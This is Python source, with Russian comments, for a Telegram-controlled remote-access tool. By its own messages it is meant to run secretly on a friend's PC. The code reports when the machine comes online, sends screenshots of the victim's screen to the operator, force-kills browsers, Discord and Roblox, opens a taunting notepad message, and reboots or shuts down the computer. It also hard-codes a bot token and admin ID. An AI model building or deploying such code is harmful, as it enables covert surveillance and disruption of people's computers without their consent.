import os
import asyncio
import pyautogui
import subprocess
import time
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import FSInputFile, ReplyKeyboardMarkup, KeyboardButton

# --- КОНФИГ ---
TOKEN = '8438376075:AAFlsQvzOLvpLf72_NIu38_V7YzdFqe9n68'
ADMIN_ID = 6445545778

bot = Bot(token=TOKEN)
dp = Dispatcher()

def get_admin_menu():
    kb = [
        [KeyboardButton(text="📸 Скриншот"), KeyboardButton(text="📉 Свернуть всё")],
        [KeyboardButton(text="📝 Блокнот с текстом"), KeyboardButton(text="❌ Закрыть всё")],
        [KeyboardButton(text="🔄 Перезагрузка"), KeyboardButton(text="🛑 Выключить ПК")]
    ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

# Уведомление при включении ПК
async def on_startup():
    try: await bot.send_message(ADMIN_ID, "😈 ПК друга в сети! Командуй.", reply_markup=get_admin_menu())
    except: pass

@dp.message(F.text == "📸 Скриншот")
async def make_screenshot(m: types.Message):
    pyautogui.screenshot("view.jpg")
    await m.answer_photo(FSInputFile("view.jpg"), caption="Что он там делает?")
    os.remove("view.jpg")

@dp.message(F.text == "📉 Свернуть всё")
async def hide_all(m: types.Message):
    subprocess.run(["powershell", "(New-Object -ComObject shell.application).MinimizeAll()"])
    await m.answer("✅ Все окна свернуты")

@dp.message(F.text == "📝 Блокнот с текстом")
async def open_note(m: types.Message):
    path = os.path.join(os.environ['TEMP'], "msg.txt")
    with open(path, "w", encoding="utf-8") as f:
        f.write("ТВОЙ ПК ПОД КОНТРОЛЕМ!\nХА-ХА-ХА!\n\n(c) Твой лучший друг")
    subprocess.Popen(["notepad.exe", path])
    await m.answer("📝 Блокнот запущен")

@dp.message(F.text == "❌ Закрыть всё")
async def kill_all(m: types.Message):
    # Убиваем браузеры и игры
    targets = ["chrome.exe", "msedge.exe", "discord.exe", "RobloxPlayerBeta.exe", "opera.exe"]
    for exe in targets:
        os.system(f"taskkill /F /IM {exe} /T")
    await m.answer("💀 Все окна закрыты")

@dp.message(F.text == "🔄 Перезагрузка")
async def reboot_pc(m: types.Message):
    await m.answer("🔄 Отправляю в ребут...")
    os.system("shutdown /r /t 0")

@dp.message(F.text == "🛑 Выключить ПК")
async def shutdown_pc(m: types.Message):
    await m.answer("🛑 Выключаю...")
    os.system("shutdown /s /t 0")

async def main():
    await on_startup()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())